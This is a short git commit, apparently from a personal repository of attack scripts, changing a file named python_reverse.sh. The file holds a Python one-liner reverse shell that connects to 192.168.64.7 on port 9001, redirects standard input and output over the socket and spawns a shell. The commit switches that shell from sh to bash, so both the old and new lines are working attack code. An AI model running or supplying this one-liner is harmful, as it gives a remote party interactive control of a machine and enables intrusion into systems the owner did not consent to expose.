b98107e98cc5479ea619f0ea1aa75bb7b6f15787
x <x@kalix>
2024-09-15 11:11:38 +0200

    python sh method

--- python_reverse.sh
+++ python_reverse.sh
@@ -2,4 +2,4 @@
 
 export RHOST="192.168.64.7";
 export RPORT=9001;
-python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
